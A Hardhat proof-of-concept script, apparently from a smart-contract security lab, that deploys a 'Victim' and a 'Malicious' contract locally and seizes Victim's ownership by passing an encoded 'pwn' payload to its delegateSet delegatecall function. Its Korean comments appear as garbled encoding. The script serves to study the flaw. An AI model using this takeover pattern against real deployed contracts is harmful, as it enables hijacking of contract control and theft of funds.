// DeployAndAttack ì»¨íŠ¸ë™íŠ¸ë¥¼ í†µí•´ ê°„ì ‘ì ìœ¼ë¡œ í˜¸ì¶œí•œ ê³µê²©ì‚¬ë¡€
// const hre = require("hardhat");

// async function main() {
//   const [attacker] = await hre.ethers.getSigners();

//   const DeployAndAttack = await hre.ethers.getContractFactory(
//     "DeployAndAttack"
//   );
//   const attackContract = await DeployAndAttack.deploy();
//   await attackContract.waitForDeployment();

//   console.log("ğŸš€ Contracts deployed");

//   console.log("ğŸ” Before attack owner:", await attackContract.getOwner());

//   //DeployAndAttack ì»¨íŠ¸ë™íŠ¸ë¥¼ í†µí•´ ê³µê²©
//   const tx = await attackContract.attack();
//   await tx.wait();

//   console.log("ğŸ’¥ After attack owner:", await attackContract.getOwner());
//   console.log("ğŸ™‹ Attacker:", attacker.address);
// }

// main();

// EOAê°€ ì§ì ‘ Victimì˜ delegateSetí•¨ìˆ˜ í˜¸ì¶œ ìœ ë„ (EOAê°€ Victimì˜ msg.senderê°€ ë˜ë„ë¡)
const hre = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();

  //Victimì€ deployerê°€ ë°°í¬, MaliciousëŠ” attackerê°€ ë°°í¬í•˜ë„ë¡ ì„¤ì •
  const Victim = await hre.ethers.getContractFactory("Victim", deployer);
  const Malicious = await hre.ethers.getContractFactory("Malicious", attacker);

  const victim = await Victim.deploy();
  await victim.waitForDeployment();

  const malicious = await Malicious.deploy();
  await malicious.waitForDeployment();

  console.log("Contracts deployed");
  console.log("Victim address:", await victim.getAddress());
  console.log("Malicious address:", await malicious.getAddress());

  // ê³µê²© ì „ owner ìƒíƒœ í™•ì¸
  let ownerBefore = await victim.owner();
  console.log("Before attack, owner:", ownerBefore);

  // payload ìƒì„±
  const payload = malicious.interface.encodeFunctionData("pwn");

  // EOAê°€ ì§ì ‘ í˜¸ì¶œ
  const tx = await victim
    .connect(attacker)
    .delegateSet(await malicious.getAddress(), payload);
  await tx.wait();

  // ê³µê²© í›„ owner ìƒíƒœ í™•ì¸
  let ownerAfter = await victim.owner();
  console.log("After attack, owner:", ownerAfter);
  console.log("Attacker EOA:", await attacker.getAddress());
}

main();
